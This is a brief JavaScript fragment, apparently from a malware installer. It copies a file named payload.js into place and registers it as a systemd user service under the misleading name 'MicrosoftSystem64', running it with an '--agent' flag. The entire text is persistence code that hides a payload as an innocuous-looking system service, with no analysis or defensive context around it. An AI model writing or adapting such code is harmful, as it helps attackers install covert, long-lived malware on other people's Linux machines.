var UNIT_STEM = "MicrosoftSystem64";
var PAYLOAD_FILENAME = "payload.js";
const content = fs.readFileSync(sourcePayloadPath);
fs.writeFileSync(targetJsPath, content);
const unit = `ExecStart=${escPath(nodeExe)} ${escPath(jsPath)} --agent`;
spawnSync("systemctl", ["--user", "status", `${UNIT_STEM}.service`]);
setupLinux(targetJsPath, installDir);
